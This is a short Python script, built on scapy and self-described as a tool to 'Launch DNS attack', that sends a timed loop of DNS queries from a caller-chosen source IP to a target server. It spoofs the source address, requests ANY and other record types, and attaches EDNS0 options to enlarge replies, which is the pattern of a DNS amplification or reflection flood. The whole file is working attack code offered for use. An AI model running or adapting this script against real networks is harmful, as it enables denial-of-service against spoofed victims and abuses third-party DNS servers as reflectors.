import argparse
from scapy.all import *
import time

def sendQueries(dnsSource, dnsDestination, queryName, duration, use_dnssec):
    """
    Send DNS queries to a DNS server
    :param dnsSource: Source IP
    :param dnsDestination: Destination IP
    :param queryName: Query name
    :param duration: Duration in seconds
    :param use_dnssec: Use DNSSEC if True
    """
    queryTypes = ["ALL", "A", "AAAA", "CNAME", "MX", "NS", "SOA", "TXT"]

    packetNumber = 0
    endTime = time.time() + duration

    while time.time() < endTime:
        for queryType in queryTypes:
            packetNumber += 1
            dnsQuery = IP(src=dnsSource, dst=dnsDestination) / UDP(sport=RandShort(), dport=53) / DNS(id=packetNumber, rd=1, qd=DNSQR(qname=queryName, qtype=queryType))

            if use_dnssec:
                dnsQuery[DNS].ad = 0
                dnsQuery[DNS].cd = 1
                dnsQuery[DNS].qr = 0
                dnsQuery[DNS].aa = 0
                dnsQuery[DNS].ra = 0
                dnsQuery[DNS].ar = DNSRROPT(rclass=8192)
            else:
                dnsQuery[DNS].ad = 0
                dnsQuery[DNS].cd = 0
                dnsQuery[DNS].qr = 0
                dnsQuery[DNS].aa = 0
                dnsQuery[DNS].ra = 0
                dnsQuery[DNS].ar = DNSRROPT(rclass=8192)

            try:
                send(dnsQuery, verbose=0)
            except Exception as e:
                print(f"An exception occurred: {e}\n")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Launch DNS attack')
    parser.add_argument('-s', '--dnsSource', type=str, help='Source IP')
    parser.add_argument('-d', '--dnsDestination', type=str, help='Destination IP')
    parser.add_argument('-q', '--queryName', type=str, help='Query name')
    parser.add_argument('-t', '--duration', type=int, help='Duration in seconds')
    parser.add_argument('--dnssec', action='store_true', help='Use DNSSEC')

    args = parser.parse_args()
    sendQueries(args.dnsSource, args.dnsDestination, args.queryName, args.duration, args.dnssec)
